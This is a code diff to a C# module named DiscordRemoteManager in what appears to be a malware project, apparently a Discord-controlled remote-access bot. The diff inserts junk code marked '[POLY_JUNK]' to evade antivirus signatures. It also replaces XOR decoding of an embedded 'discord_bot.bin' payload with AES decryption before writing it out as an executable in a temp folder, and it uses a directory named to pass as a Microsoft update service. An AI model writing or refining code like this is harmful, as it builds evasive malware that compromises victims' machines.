@@ -2,11 +2,18 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
+using VanguardCore;
 
 namespace FinalBot.Modules
 {
     public static class DiscordRemoteManager
     {
+        // [POLY_JUNK]
+        private static void _vanguard_addd76dc() {
+            int val = 70307;
+            if (val > 50000) Console.WriteLine("Hash:" + 70307);
+        }
+
         private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
         private static readonly string _profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MsUpdateSvc", "DiscordProfile");
 
@@ -31,9 +38,10 @@ namespace FinalBot.Modules
                     string binPath = Path.Combine(VanguardCore.Modules.ResourceModule.WorkDir, "discord_bot.bin");
                     if (!File.Exists(binPath)) return "❌ Failed: Binary 'discord_bot.bin' not found.";
 
-                    byte[] bytes = File.ReadAllBytes(binPath);
-                    for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
-                    File.WriteAllBytes(tempExe, bytes);
+                    byte[] encrypted = File.ReadAllBytes(binPath);
+                    byte[] decrypted = AesHelper.Decrypt(encrypted);
+                    if (decrypted != null) File.WriteAllBytes(tempExe, decrypted);
+                    else return "❌ Failed: AES decryption of 'discord_bot.bin' failed.";
                 }
 
                 // Ensure profile dir exists
